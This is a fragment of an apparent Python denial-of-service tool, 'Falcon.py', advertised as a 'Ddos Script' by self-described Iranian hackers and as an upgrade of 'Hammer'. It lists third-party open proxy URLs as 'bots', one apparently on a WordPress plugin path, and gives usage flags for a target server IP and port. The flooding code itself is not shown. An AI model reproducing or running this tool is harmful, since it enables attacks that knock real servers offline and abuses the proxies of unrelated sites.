...
def my_bots():
	global bots
	bots=[]
        bots.append("https://cassiosmmarketing.com/wp-content/plugins/super-links/application/helpers/super-links-proxy.php?")
	bots.append("https://mygoodstream.pw/proxy.php?")
	bots.append("https://raspe.id.au/bypass/miniProxy.php?")
...
\033[92m   Ddos Script powered By Mr.Falcon / By Iranian Hackers
upgrade for Hammer
	please subscribe my github chanel
	https://github.com/MrFalconn
	usage : python Falcon.py  [-s] [-p] [-t]
	-s : server ip 
	-p : port default 80
